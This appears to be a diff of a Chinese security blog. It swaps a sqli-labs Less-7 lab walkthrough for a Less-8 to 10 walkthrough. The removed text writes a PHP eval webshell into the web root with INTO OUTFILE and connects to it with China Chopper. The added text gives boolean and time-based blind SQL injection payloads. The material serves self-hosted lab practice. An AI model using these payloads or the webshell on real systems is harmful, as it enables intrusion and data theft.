@@ -81,24 +81,20 @@
 
 
 
-<meta name="description" content="前言由于less7相比于其他的关卡比较特殊，因此单独对这个靶场进行详细的分析。less7靶场我们要学习上传一句话木马获得网页的控制权，并且使用工具（例如菜刀）来进行连接。  less7输入id后，我们发现这次的返回文字多了一段“Use outfile……”，那么结合提示我们就可以判断出这题需要我们通过写入文件并注入一句话木马来对网页实现控制。">
+<meta name="description" content="前言接下来的三关就是盲注题了，盲注是SQL注入中最重要的技能，当页面中的数据无法回显到前端时，就需要借助盲注手段来判断。同时，盲注往往也带有着工具或脚本的使用，我们也可以借此机会进行学习。  关于盲注盲注的使用要基于用户自己可以对输入进行控制，且要能接入进执行代码中。盲注分为两种：布尔盲注和时间盲注。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqli-labs练习-less7">
-<meta property="og:url" content="http://example.com/2021/10/01/sqli-labs%E7%BB%83%E4%B9%A0-less7/index.html">
+<meta property="og:title" content="sqli-labs练习-less8-10">
+<meta property="og:url" content="http://example.com/2021/10/02/sqli-labs%E7%BB%83%E4%B9%A0-less8-10/index.html">
 <meta property="og:site_name" content="mrl64&#39;s Blog">
-<meta property="og:description" content="前言由于less7相比于其他的关卡比较特殊，因此单独对这个靶场进行详细的分析。less7靶场我们要学习上传一句话木马获得网页的控制权，并且使用工具（例如菜刀）来进行连接。  less7输入id后，我们发现这次的返回文字多了一段“Use outfile……”，那么结合提示我们就可以判断出这题需要我们通过写入文件并注入一句话木马来对网页实现控制。">
+<meta property="og:description" content="前言接下来的三关就是盲注题了，盲注是SQL注入中最重要的技能，当页面中的数据无法回显到前端时，就需要借助盲注手段来判断。同时，盲注往往也带有着工具或脚本的使用，我们也可以借此机会进行学习。  关于盲注盲注的使用要基于用户自己可以对输入进行控制，且要能接入进执行代码中。盲注分为两种：布尔盲注和时间盲注。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.loli.net/2021/10/01/NsHumx4CFD76ApS.png">
-<meta property="og:image" content="https://i.loli.net/2021/10/01/ALn82iWcZdBbgDx.png">
-<meta property="og:image" content="https://i.loli.net/2021/10/01/vwMCumkdZDHxVip.png">
-<meta property="og:image" content="https://i.loli.net/2021/10/01/VCnqKR8lzvgckyX.png">
-<meta property="og:image" content="https://i.loli.net/2021/10/01/2JxMzgjCuT9REoY.png">
-<meta property="article:published_time" content="2021-10-01T02:53:40.000Z">
-<meta property="article:modified_time" content="2021-10-01T04:56:13.973Z">
+<meta property="og:image" content="https://i.loli.net/2021/10/02/WrpS1KDPozOTfHJ.jpg">
+<meta property="article:published_time" content="2021-10-02T04:56:56.000Z">
+<meta property="article:modified_time" content="2021-10-02T07:07:10.441Z">
 <meta property="article:author" content="liszt_lin">
 <meta property="article:tag" content="-web前端 -mysql">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2021/10/01/NsHumx4CFD76ApS.png">
+<meta name="twitter:image" content="https://i.loli.net/2021/10/02/WrpS1KDPozOTfHJ.jpg">
 
 
 
@@ -128,13 +124,13 @@
 
 
 
-  <link rel="canonical" href="http://example.com/2021/10/01/sqli-labs练习-less7/"/>
+  <link rel="canonical" href="http://example.com/2021/10/02/sqli-labs练习-less8-10/"/>
 
 
 
 
 
-  <title>sqli-labs练习-less7 | mrl64's Blog</title>
+  <title>sqli-labs练习-less8-10 | mrl64's Blog</title>
   
 
 
@@ -271,7 +267,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/01/sqli-labs%E7%BB%83%E4%B9%A0-less7/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/02/sqli-labs%E7%BB%83%E4%B9%A0-less8-10/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -288,7 +284,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">sqli-labs练习-less7</h1>
+          <h1 class="post-title" itemprop="name headline">sqli-labs练习-less8-10</h1>
         
 
         <div class="post-meta">
@@ -300,8 +296,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-10-01T10:53:40+08:00">
-                2021-10-01
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-10-02T12:56:56+08:00">
+                2021-10-02
               </time>
             
 
@@ -361,21 +357,41 @@
 
       
         <blockquote>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于less7相比于其他的关卡比较特殊，因此单独对这个靶场进行详细的分析。less7靶场我们要学习上传一句话木马获得网页的控制权，并且使用工具（例如菜刀）来进行连接。</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接下来的三关就是盲注题了，盲注是SQL注入中最重要的技能，当页面中的数据无法回显到前端时，就需要借助盲注手段来判断。同时，盲注往往也带有着工具或脚本的使用，我们也可以借此机会进行学习。</p>
 </blockquote>
-<h1 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h1><p>输入id后，我们发现这次的返回文字多了一段“Use outfile……”，那么结合提示我们就可以判断出这题需要我们通过写入文件并注入一句话木马来对网页实现控制。</p>
+<h1 id="关于盲注"><a href="#关于盲注" class="headerlink" title="关于盲注"></a>关于盲注</h1><p>盲注的使用要基于用户自己可以对输入进行控制，且要能接入进执行代码中。盲注分为两种：布尔盲注和时间盲注。</p>
 <span id="more"></span>
 
-<p>那么首先，我们也要先找到注入点。试试单引号，双引号，单引号加括号等多种形式，我们找到了答案为单引号加上两个括号。接下来，我们开始进行注入。</p>
-<p>首先要注意的是，我们在进行outfile文件注入的时候必须要有root权限，而且要知道网站绝对路径的地址。不过由于这个靶场是我们自己搭的，因此很容易可以满足这些条件，当然，我们也可在之前的靶场中使用<code>@@datadir</code>指令来获得数据库的路径：<br><img src="https://i.loli.net/2021/10/01/NsHumx4CFD76ApS.png"></p>
-<p>好有了绝对路径，直接动手，我们使用这段代码：<br><code>select ... into outfile &quot;绝对路径&quot;</code><br>这段代码可以将select的内容注入进绝对路径下的一个文件，我们这里注入到一个7.php的文件下，如果没有这个文件会自动创建一个同名文件，但是这条代码不会覆盖原文件，因此写入时最好一次成功，如果要再次写入则需要更换文件名。</p>
-<p>要特别注意的是，在复制绝对路径后，我们需要在“\”后再加上一个“\”或者将“\”改成“/”，例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\7.php</span><br><span class="line">D:/phpstudy_pro/WWW/sqli-labs-master/Less-7/7.php</span><br></pre></td></tr></table></figure>
-<p>有代码基础的一定知道，“\”代表着转义字符，而“\”才是意味着字符“\”。而“\”的路径是windows系统所独有的表达方式，但“/”表达的路径是可以被windows、linux和mac等操作系统共同识别的，因此更推荐第二种表达路径的方式。</p>
-<p>接下来我们要注入一句话木马了，php格式的一句话木马为：<br><code>&lt;?php @eval($_POST[&#39;chopper&#39;]);?&gt;</code><br>其中的chopper是值，前面的POST（或者REQUEST等）用来获取这个值，这个值之后要用到，可自定义。这样我们就可以使用工具（菜刀，webshell等）进行访问了。</p>
-<p>注入之后我们发现页面虽然报错，但是浏览本地文件，发现了这个7.php已经成功注入进文件夹中了，并且代码也已经被成功写入：<br><img src="https://i.loli.net/2021/10/01/ALn82iWcZdBbgDx.png"><br><img src="https://i.loli.net/2021/10/01/vwMCumkdZDHxVip.png"></p>
-<p>注入成功，我们就可以掏出我们的工具了，这里使用菜刀。<br><img src="https://i.loli.net/2021/10/01/VCnqKR8lzvgckyX.png"><br><img src="https://i.loli.net/2021/10/01/2JxMzgjCuT9REoY.png"><br>如上，连接成功！</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>文件写入是解题时一项重要的技能，在解题时学习工具的使用，将会更好的帮助我们获取数据，解开谜题。</p>
+<ul>
+<li>布尔盲注：通过返回true与false的不同，导致页面的回显不同进行判断，之前使用and 1=1与and 1=2判断注入点也是用此原理</li>
+<li>时间盲注：通过返回true与false的不同，导致页面的加载时间不同进行判断，一般使用if语句</li>
+</ul>
+<h1 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h1><p>标题就是基于单引号的布尔盲注，那我们先将id和单引号一起输入进去，然后发现这是一点报错都没有啊。我们可以查看源码，发现报错这一行（下列源码的第三行）被注释了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">//echo &#x27;You are in...........&#x27;;</span><br><span class="line">//print_r(mysql_error());</span><br><span class="line">//echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>那么这种情况下我们就需要使用盲注了。先用and 1=1和and 1=2判断，发现前者会回显一个“You are in….”，而后者依然是什么都没有，那么我们就知道了，当返回true时，页面会回显一句话，反之则什么都不回显。</p>
+<p>既然掌握了原理，那么我们就可以开始准备注入了。下面我们来介绍我们需要用到的函数：</p>
+<ul>
+<li>length()：返回字符串的长度</li>
+<li>substr(str,start,len):截取“str”字符串从第“start”位开始的“len”长度的字符</li>
+<li>ascii()：返回字符的ascii码值，关于ascii码值可以参考下图：<br><img src="https://i.loli.net/2021/10/02/WrpS1KDPozOTfHJ.jpg"></li>
+</ul>
+<p>正式开始注入，我们使用and或者or来对代码进行连接，一定要注意，and的true返回条件是左右两边都为真，or的true返回条件只需要有一边为真就行了，因此在这里前面id如果存在于数据库之中要用and，不存在则用or。由于刷POST题时犯了个蠢，在这里先提一下。</p>
+<p>由于我们已经知道数据库的名称为security了，所以我们就不从猜数据库开始了，可以用<code>length(database())</code>先确定数据库名称的长度，再一位一位进行猜测。这里我们直接开始猜表。首先是表的个数：<br><code>n=(select count(table_name) from information_schema.tables where table_schema=&#39;数据库名&#39;)</code></p>
+<p>n可以替换为任何数，后面的查询语句也可以替换来查询表的列数等等。当返回true时，也就是我们看到“You are in….”时，代表着我们猜对了，我们就可以进行下一步猜表名了：<br><code>ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),m,1))=n</code></p>
+<p>这里我们用limit限制了查询的表为数据库中的第一个表，这个函数验证的是第一个表的第m个字段的ascii码是否为n，这个等号也可以替换为大于号或者小于号来帮助我们缩小范围。通过这种方法我们可以逐步推出第一个表的名字为emali。但是一个个试的效率是十分低的，我们可以用二分法来提高效率，或者学习如何使用脚本或者工具来帮助我们提高效率，这里就不展开了。</p>
+<p>得到表的名称后，我们可以更改以上代码的查询语句一步步查询出我们想要的数据了。</p>
+<h1 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h1><p>这关根据标题要使用时间盲注，但我先用了布尔盲注进行测试，结果发现无论返回true还是false，页面都会回显“You are in….”，查看源码就可以发现确实如此，因此这个靶场我们就要使用时间盲注了。</p>
+<p>使用时间盲注时我们会用到if语句和sleep()函数进行配合：</p>
+<ul>
+<li>if(expr1,expr2,expr3)：当语句1返回的结果为true时，执行语句2，反之则执行语句3</li>
+<li>sleep(x)：延迟执行脚本x秒</li>
+</ul>
+<p>时间盲注有个很显著的优点，不需要通过页面回显来判断，在页面没有回显内容的时候，时间盲注就可以很好的帮助我们进行判断。例如我们同样来判断数据库中表的个数：<br><code>if(n=(select count(table_name) from information_schema.tables where table_schema=&#39;数据库名&#39;),sleep(3),1)</code></p>
+<p>显而易见，当数据库中表的个数为n时，脚本将暂停3秒再执行，否则什么都不会发生，这样我们就可以通过观察网页的加载时间来判断返回值是true还是false。</p>
+<p>这样一来，我们只要将if()中的语句1进行更改，就可以像less-8一样逐步获得数据库中的信息了。</p>
+<h1 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h1><p>把单引号换成双引号，然后把less-9的过程走一遍，然后你就成功又做出了一关，这真是令人感到高兴呢（bushi）。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>刷到这里，前十关的GET型靶场就刷完了，接下来就是POST型靶场了，但其实两者的区别不大，只要我们掌握好前十关用到的方法，熟练运用，一直到less-16相信都能很快解开。</p>
 
       
     </div>
@@ -406,8 +422,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2021/09/28/sqli-labs%E7%BB%83%E4%B9%A0-less5-6/" rel="next" title="sqli-labs练习-less5-6">
-                <i class="fa fa-chevron-left"></i> sqli-labs练习-less5-6
+              <a href="/2021/10/01/sqli-labs%E7%BB%83%E4%B9%A0-less7/" rel="next" title="sqli-labs练习-less7">
+                <i class="fa fa-chevron-left"></i> sqli-labs练习-less7
               </a>
             
           </div>
@@ -415,10 +431,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2021/10/02/sqli-labs%E7%BB%83%E4%B9%A0-less8-10/" rel="prev" title="sqli-labs练习-less8-10">
-                sqli-labs练习-less8-10 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -557,7 +569,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less7"><span class="nav-number"></span> <span class="nav-text">less7</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number"></span> <span class="nav-text">总结</span></a></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E7%9B%B2%E6%B3%A8"><span class="nav-number"></span> <span class="nav-text">关于盲注</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less8"><span class="nav-number"></span> <span class="nav-text">less8</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less9"><span class="nav-number"></span> <span class="nav-text">less9</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less10"><span class="nav-number"></span> <span class="nav-text">less10</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number"></span> <span class="nav-text">总结</span></a></div>
             
 
           </div>
